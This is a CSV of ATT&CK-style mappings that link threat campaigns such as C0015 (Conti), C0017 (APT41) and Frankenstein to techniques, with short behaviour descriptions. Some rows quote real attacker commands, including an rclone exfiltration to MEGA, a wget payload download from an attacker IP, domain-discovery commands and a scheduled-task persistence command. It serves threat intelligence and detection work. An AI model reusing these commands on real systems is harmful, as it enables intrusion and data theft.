,source ID,source name,source type,mapping type,target ID,target name,target type,mapping description
15957,C0025,2016 Ukraine Electric Power Attack,campaign,uses,T1543.003,Windows Service,technique,"During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. "
2945,C0010,C0010,campaign,uses,T1583.001,Domains,technique,"For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer."
12160,C0010,C0010,campaign,uses,T1584.001,Domains,technique,"During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company."
1743,C0010,C0010,campaign,uses,T1189,Drive-by Compromise,technique,"During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021."
8691,C0010,C0010,campaign,uses,T1608.004,Drive-by Target,technique,"For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information."
15943,C0010,C0010,campaign,uses,T1105,Ingress Tool Transfer,technique,"During C0010, UNC3890 actors downloaded tools and malware onto a compromised host."
9114,C0010,C0010,campaign,uses,T1587.001,Malware,technique,"For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP."
1689,C0010,C0010,campaign,uses,T1588.002,Tool,technique,"For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2."
8398,C0010,C0010,campaign,uses,T1608.001,Upload Malware,technique,"For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system. "
7261,C0010,C0010,campaign,uses,T1608.002,Upload Tool,technique,"For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system."
7309,C0011,C0011,campaign,uses,T1587.003,Digital Certificates,technique,"For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered."
8158,C0011,C0011,campaign,uses,T1583.001,Domains,technique,"For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India."
10625,C0011,C0011,campaign,uses,T1204.002,Malicious File,technique,"During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email."
11009,C0011,C0011,campaign,uses,T1204.001,Malicious Link,technique,"During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email."
12377,C0011,C0011,campaign,uses,T1566.001,Spearphishing Attachment,technique,"During C0011, Transparent Tribe sent malicious attachments via email to student targets in India. "
7093,C0011,C0011,campaign,uses,T1566.002,Spearphishing Link,technique,"During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India."
15755,C0011,C0011,campaign,uses,T1608.001,Upload Malware,technique,"For C0011, Transparent Tribe hosted malicious documents on domains registered by the group. "
1813,C0011,C0011,campaign,uses,T1059.005,Visual Basic,technique,"For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host."
1875,C0015,C0015,campaign,uses,T1553.002,Code Signing,technique,"For C0015, the threat actors used DLL files that had invalid certificates."
12673,C0015,C0015,campaign,uses,T1486,Data Encrypted for Impact,technique,"During C0015, the threat actors used Conti ransomware to encrypt a compromised network."
13583,C0015,C0015,campaign,uses,T1030,Data Transfer Size Limits,technique,"During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration. "
11461,C0015,C0015,campaign,uses,T1005,Data from Local System,technique,"During C0015, the threat actors obtained files and data from the compromised network."
10229,C0015,C0015,campaign,uses,T1039,Data from Network Shared Drive,technique,"During C0015, the threat actors collected files from network shared drives prior to network encryption."
14437,C0015,C0015,campaign,uses,T1069.002,Domain Groups,technique,"During C0015, the threat actors use the command `net group ""domain admins"" /dom` to enumerate domain groups."
2604,C0015,C0015,campaign,uses,T1482,Domain Trust Discovery,technique,"During C0015, the threat actors used the command `nltest /domain_trusts /all_trusts` to enumerate domain trusts."
5505,C0015,C0015,campaign,uses,T1055.001,Dynamic-link Library Injection,technique,"During C0015, the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process. "
5430,C0015,C0015,campaign,uses,T1567.002,Exfiltration to Cloud Storage,technique,"During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command `rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`."
1099,C0015,C0015,campaign,uses,T1083,File and Directory Discovery,technique,"During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful."
5945,C0015,C0015,campaign,uses,T1105,Ingress Tool Transfer,technique,"During C0015, the threat actors downloaded additional tools and files onto a compromised network."
6979,C0015,C0015,campaign,uses,T1059.007,JavaScript,technique,"During C0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code."
11945,C0015,C0015,campaign,uses,T1570,Lateral Tool Transfer,technique,"During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network."
15729,C0015,C0015,campaign,uses,T1074.001,Local Data Staging,technique,"During C0015, PowerView's file share enumeration results were stored in the file `c:\ProgramData\found_shares.txt`."
5241,C0015,C0015,campaign,uses,T1069.001,Local Groups,technique,"During C0015, the threat actors used the command `net localgroup ""adminstrator"" ` to identify accounts with local administrator rights."
8221,C0015,C0015,campaign,uses,T1204.002,Malicious File,technique,"During C0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document."
3163,C0015,C0015,campaign,uses,T1588.001,Malware,technique,"For C0015, the threat actors used Cobalt Strike and Conti ransomware. "
3820,C0015,C0015,campaign,uses,T1036,Masquerading,technique,"During C0015, the threat actors named a binary file `compareForfor.jpg` to disguise it as a JPG file."
6467,C0015,C0015,campaign,uses,T1218.005,Mshta,technique,"During C0015, the threat actors used `mshta` to execute DLLs."
2039,C0015,C0015,campaign,uses,T1135,Network Share Discovery,technique,"During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares."
13468,C0015,C0015,campaign,uses,T1027,Obfuscated Files or Information,technique,"During C0015, the threat actors used Base64-encoded strings."
2556,C0015,C0015,campaign,uses,T1057,Process Discovery,technique,"During C0015, the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes."
290,C0015,C0015,campaign,uses,T1218.010,Regsvr32,technique,"During C0015, the threat actors employed code that used `regsvr32` for execution."
13731,C0015,C0015,campaign,uses,T1219,Remote Access Software,technique,"During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network."
7603,C0015,C0015,campaign,uses,T1021.001,Remote Desktop Protocol,technique,"During C0015, the threat actors used RDP to access specific network hosts of interest."
5245,C0015,C0015,campaign,uses,T1018,Remote System Discovery,technique,"During C0015, the threat actors used the commands `net view /all /domain` and `ping` to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration."
3636,C0015,C0015,campaign,uses,T1218.011,Rundll32,technique,"During C0015, the threat actors loaded DLLs via `rundll32` using the `svchost` process."
446,C0015,C0015,campaign,uses,T1566.001,Spearphishing Attachment,technique,"For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims."
9546,C0015,C0015,campaign,uses,T1016,System Network Configuration Discovery,technique,"During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host. "
1989,C0015,C0015,campaign,uses,T1124,System Time Discovery,technique,"During C0015, the threat actors used the command `net view /all time` to gather the local time of a compromised network."
8699,C0015,C0015,campaign,uses,T1588.002,Tool,technique,"For C0015, the threat actors obtained a variety of tools, including AdFind,  AnyDesk, and Process Hacker."
2790,C0015,C0015,campaign,uses,T1059.005,Visual Basic,technique,"During C0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code."
14721,C0015,C0015,campaign,uses,T1059.003,Windows Command Shell,technique,"During C0015, the threat actors used `cmd.exe` to execute commands and run malicious binaries."
628,C0015,C0015,campaign,uses,T1047,Windows Management Instrumentation,technique,"During C0015, the threat actors used `wmic` and `rundll32` to load Cobalt Strike onto a target host."
12465,C0017,C0017,campaign,uses,T1134,Access Token Manipulation,technique,"During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local `NT AUTHORITY\SYSTEM` privilege escalation."
900,C0017,C0017,campaign,uses,T1560.003,Archive via Custom Method,technique,"During C0017, APT41 hex-encoded PII data prior to exfiltration."
15940,C0017,C0017,campaign,uses,T1005,Data from Local System,technique,"During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. "
1623,C0017,C0017,campaign,uses,T1102.001,Dead Drop Resolver,technique,"During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign."
6298,C0017,C0017,campaign,uses,T1140,Deobfuscate/Decode Files or Information,technique,"During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads."
3658,C0017,C0017,campaign,uses,T1041,Exfiltration Over C2 Channel,technique,"During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration."
11058,C0017,C0017,campaign,uses,T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,technique,"During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain."
4065,C0017,C0017,campaign,uses,T1567,Exfiltration Over Web Service,technique,"During C0017, APT41 used Cloudflare services for data exfiltration."
15356,C0017,C0017,campaign,uses,T1190,Exploit Public-Facing Application,technique,"During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access."
10382,C0017,C0017,campaign,uses,T1068,Exploitation for Privilege Escalation,technique,"During C0017, APT41 abused named pipe impersonation for privilege escalation."
8323,C0017,C0017,campaign,uses,T1574,Hijack Execution Flow,technique,"During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries. "
2624,C0017,C0017,campaign,uses,T1105,Ingress Tool Transfer,technique,"During C0017, APT41 downloaded malicious payloads onto compromised systems."
3917,C0017,C0017,campaign,uses,T1059.007,JavaScript,technique,"During C0017, APT41 deployed JScript web shells on compromised systems.
"
5375,C0017,C0017,campaign,uses,T1074.001,Local Data Staging,technique,"During C0017, APT41 copied the local `SAM` and `SYSTEM` Registry hives to a staging directory."
8074,C0017,C0017,campaign,uses,T1036.004,Masquerade Task or Service,technique,"During C0017, APT41 used `SCHTASKS  /Change` to modify legitimate scheduled tasks to run malicious code."
4975,C0017,C0017,campaign,uses,T1036.005,Match Legitimate Name or Location,technique,"During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp  to .upx likely to avoid hunting detections."
13520,C0017,C0017,campaign,uses,T1027,Obfuscated Files or Information,technique,"During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection."
6340,C0017,C0017,campaign,uses,T1001.003,Protocol Impersonation,technique,"During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server."
14211,C0017,C0017,campaign,uses,T1090,Proxy,technique,"During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic."
2737,C0017,C0017,campaign,uses,T1053.005,Scheduled Task,technique,"During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility`, `\Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`. "
7397,C0017,C0017,campaign,uses,T1003.002,Security Account Manager,technique,"During C0017, APT41 copied the `SAM` and `SYSTEM` Registry hives for credential harvesting."
1547,C0017,C0017,campaign,uses,T1027.002,Software Packing,technique,"During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries."
2850,C0017,C0017,campaign,uses,T1082,System Information Discovery,technique,"During C0017, APT41 issued `ping -n 1 ((cmd /c dir c:\|findstr Number).split()[-1]+` commands to find the volume serial number of compromised systems.
"
3484,C0017,C0017,campaign,uses,T1016,System Network Configuration Discovery,technique,"During C0017, APT41 used `cmd.exe /c ping %userdomain%` for discovery."
8450,C0017,C0017,campaign,uses,T1033,System Owner/User Discovery,technique,"During C0017, APT41 used `whoami` to gather information from victim machines."
9426,C0017,C0017,campaign,uses,T1588.002,Tool,technique,"For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato."
13836,C0017,C0017,campaign,uses,T1071.001,Web Protocols,technique,"During C0017, APT41 ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.
"
10485,C0017,C0017,campaign,uses,T1102,Web Service,technique,"During C0017, APT41 used the Cloudflare services for C2 communications."
11377,C0017,C0017,campaign,uses,T1505.003,Web Shell,technique,"During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects."
5949,C0017,C0017,campaign,uses,T1059.003,Windows Command Shell,technique,"During C0017, APT41 used `cmd.exe` to execute reconnaissance commands."
5253,C0018,C0018,campaign,uses,T1027.010,Command Obfuscation,technique,"During C0018, the threat actors used Base64 to encode their PowerShell scripts."
3836,C0018,C0018,campaign,uses,T1486,Data Encrypted for Impact,technique,"During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network."
3387,C0018,C0018,campaign,uses,T1190,Exploit Public-Facing Application,technique,"During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832."
5639,C0018,C0018,campaign,uses,T1105,Ingress Tool Transfer,technique,"During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network."
5365,C0018,C0018,campaign,uses,T1570,Lateral Tool Transfer,technique,"During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy."
15102,C0018,C0018,campaign,uses,T1036,Masquerading,technique,"During C0018, AvosLocker was disguised using the victim company name as the filename."
10027,C0018,C0018,campaign,uses,T1036.005,Match Legitimate Name or Location,technique,"For C0018, the threat actors renamed a Sliver payload to `vmware_kb.exe`."
7466,C0018,C0018,campaign,uses,T1046,Network Service Discovery,technique,"During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning."
14152,C0018,C0018,campaign,uses,T1571,Non-Standard Port,technique,"During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections."
14114,C0018,C0018,campaign,uses,T1059.001,PowerShell,technique,"During C0018, the threat actors used encoded PowerShell scripts for execution."
10279,C0018,C0018,campaign,uses,T1219,Remote Access Software,technique,"During C0018, the threat actors used AnyDesk to transfer tools between systems."
1913,C0018,C0018,campaign,uses,T1021.001,Remote Desktop Protocol,technique,"During C0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892."
9752,C0018,C0018,campaign,uses,T1218.011,Rundll32,technique,"During C0018, the threat actors used `rundll32` to run Mimikatz."
9354,C0018,C0018,campaign,uses,T1072,Software Deployment Tools,technique,"During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network."
2707,C0018,C0018,campaign,uses,T1016,System Network Configuration Discovery,technique,"During C0018, the threat actors ran `nslookup` and Advanced IP Scanner on the target network."
9497,C0018,C0018,campaign,uses,T1033,System Owner/User Discovery,technique,"During C0018, the threat actors collected `whoami` information via PowerShell scripts."
6184,C0018,C0018,campaign,uses,T1588.002,Tool,technique,"For C0018, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy."
10860,C0018,C0018,campaign,uses,T1071.001,Web Protocols,technique,"During C0018, the threat actors used HTTP for C2 communications."
2961,C0018,C0018,campaign,uses,T1047,Windows Management Instrumentation,technique,"During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (`wmiprvse.exe`) to execute a variety of encoded PowerShell scripts using the `DownloadString` method."
2028,C0021,C0021,campaign,uses,T1573.002,Asymmetric Cryptography,technique,"During C0021, the threat actors used SSL via TCP port 443 for C2 communications."
14706,C0021,C0021,campaign,uses,T1027.010,Command Obfuscation,technique,"During C0021, the threat actors used encoded PowerShell commands."
9766,C0021,C0021,campaign,uses,T1140,Deobfuscate/Decode Files or Information,technique,"During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'`, in place of `FromBase64String` which is normally used to decode base64."
11318,C0021,C0021,campaign,uses,T1584.001,Domains,technique,"For C0021, the threat actors used legitimate but compromised domains to host malicious payloads."
15016,C0021,C0021,campaign,uses,T1583.001,Domains,technique,"For C0021, the threat actors registered domains for use in C2."
8217,C0021,C0021,campaign,uses,T1027.009,Embedded Payloads,technique,"For C0021, the threat actors embedded a base64-encoded payload within a LNK file."
9535,C0021,C0021,campaign,uses,T1105,Ingress Tool Transfer,technique,"During C0021, the threat actors downloaded additional tools and files onto victim machines. "
13369,C0021,C0021,campaign,uses,T1204.001,Malicious Link,technique,"During C0021, the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file."
2741,C0021,C0021,campaign,uses,T1095,Non-Application Layer Protocol,technique,"During C0021, the threat actors used TCP for some C2 communications."
3976,C0021,C0021,campaign,uses,T1059.001,PowerShell,technique,"During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file."
8400,C0021,C0021,campaign,uses,T1218.011,Rundll32,technique,"During C0021, the threat actors used `rundll32.exe` to execute the Cobalt Strike Beacon loader DLL."
2122,C0021,C0021,campaign,uses,T1566.002,Spearphishing Link,technique,"During C0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks."
7596,C0021,C0021,campaign,uses,T1588.002,Tool,technique,"For C0021, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile."
4388,C0021,C0021,campaign,uses,T1608.001,Upload Malware,technique,"For C0021, the threat actors uploaded malware to websites under their control."
3609,C0021,C0021,campaign,uses,T1071.001,Web Protocols,technique,"During C0021, the threat actors used HTTP for some of their C2 communications."
2196,C0004,CostaRicto,campaign,uses,T1005,Data from Local System,technique,"During CostaRicto, the threat actors collected data and files from compromised networks."
2451,C0004,CostaRicto,campaign,uses,T1583.001,Domains,technique,"For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains."
3516,C0004,CostaRicto,campaign,uses,T1133,External Remote Services,technique,"During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment."
6472,C0004,CostaRicto,campaign,uses,T1105,Ingress Tool Transfer,technique,"During CostaRicto, the threat actors downloaded malware and tools onto a compromised host."
15528,C0004,CostaRicto,campaign,uses,T1587.001,Malware,technique,"For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT."
14608,C0004,CostaRicto,campaign,uses,T1090.003,Multi-hop Proxy,technique,"During CostaRicto, the threat actors used a layer of proxies to manage C2 communications. "
7357,C0004,CostaRicto,campaign,uses,T1046,Network Service Discovery,technique,"During CostaRicto, the threat actors employed nmap and pscan to scan target environments. "
15781,C0004,CostaRicto,campaign,uses,T1572,Protocol Tunneling,technique,"During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain. "
13144,C0004,CostaRicto,campaign,uses,T1053.005,Scheduled Task,technique,"During CostaRicto, the threat actors used scheduled tasks to download backdoor tools. "
610,C0004,CostaRicto,campaign,uses,T1588.002,Tool,technique,"During CostaRicto, the threat actors obtained open source tools to use in their operations. "
14019,C0001,Frankenstein,campaign,uses,T1119,Automated Collection,technique,"During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information."
13914,C0001,Frankenstein,campaign,uses,T1020,Automated Exfiltration,technique,"During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2."
13291,C0001,Frankenstein,campaign,uses,T1027.010,Command Obfuscation,technique,"During Frankenstein, the threat actors ran encoded commands from the command line."
5178,C0001,Frankenstein,campaign,uses,T1005,Data from Local System,technique,"During Frankenstein, the threat actors used Empire to gather various local system information."
2331,C0001,Frankenstein,campaign,uses,T1140,Deobfuscate/Decode Files or Information,technique,"During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload."
5048,C0001,Frankenstein,campaign,uses,T1041,Exfiltration Over C2 Channel,technique,"During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2."
14343,C0001,Frankenstein,campaign,uses,T1203,Exploitation for Client Execution,technique,"During Frankenstein, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine."
15971,C0001,Frankenstein,campaign,uses,T1105,Ingress Tool Transfer,technique,"During Frankenstein, the threat actors downloaded files and tools onto a victim machine."
3995,C0001,Frankenstein,campaign,uses,T1127.001,MSBuild,technique,"During Frankenstein, the threat actors used MSbuild to execute an actor-created file."
9286,C0001,Frankenstein,campaign,uses,T1204.002,Malicious File,technique,"During Frankenstein, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email."
8162,C0001,Frankenstein,campaign,uses,T1036.004,Masquerade Task or Service,technique,"During Frankenstein, the threat actors named a malicious scheduled task ""WinUpdate"" for persistence."
8468,C0001,Frankenstein,campaign,uses,T1059.001,PowerShell,technique,"During Frankenstein, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts."
7088,C0001,Frankenstein,campaign,uses,T1057,Process Discovery,technique,"During Frankenstein, the threat actors used Empire to obtain a list of all running processes."
5738,C0001,Frankenstein,campaign,uses,T1053.005,Scheduled Task,technique,"During Frankenstein, the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named ""WinUpdate"" "
6194,C0001,Frankenstein,campaign,uses,T1518.001,Security Software Discovery,technique,"During Frankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system."
11148,C0001,Frankenstein,campaign,uses,T1566.001,Spearphishing Attachment,technique,"During Frankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents."
11747,C0001,Frankenstein,campaign,uses,T1573.001,Symmetric Cryptography,technique,"During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC."
3674,C0001,Frankenstein,campaign,uses,T1497.001,System Checks,technique,"During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution."
10686,C0001,Frankenstein,campaign,uses,T1082,System Information Discovery,technique,"During Frankenstein, the threat actors used Empire to obtain the compromised machine's name."
2054,C0001,Frankenstein,campaign,uses,T1016,System Network Configuration Discovery,technique,"During Frankenstein, the threat actors used Empire to find the public IP address of a compromised system."
15003,C0001,Frankenstein,campaign,uses,T1033,System Owner/User Discovery,technique,"During Frankenstein, the threat actors used Empire to enumerate hosts and gather username, machine name, and administrative permissions information."
5216,C0001,Frankenstein,campaign,uses,T1221,Template Injection,technique,"During Frankenstein, the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website."
15563,C0001,Frankenstein,campaign,uses,T1588.002,Tool,technique,"For Frankenstein, the threat actors obtained and used Empire."
7746,C0001,Frankenstein,campaign,uses,T1059.005,Visual Basic,technique,"During Frankenstein, the threat actors used Word documents that prompted the victim to enable macros and run a Visual Basic script."
15185,C0001,Frankenstein,campaign,uses,T1071.001,Web Protocols,technique,"During Frankenstein, the threat actors used HTTP GET requests for C2."
14586,C0001,Frankenstein,campaign,uses,T1059.003,Windows Command Shell,technique,"During Frankenstein, the threat actors ran a command script to set up persistence as a scheduled task named ""WinUpdate"", as well as other encoded commands from the command-line "
7242,C0001,Frankenstein,campaign,uses,T1047,Windows Management Instrumentation,technique,"During Frankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version."
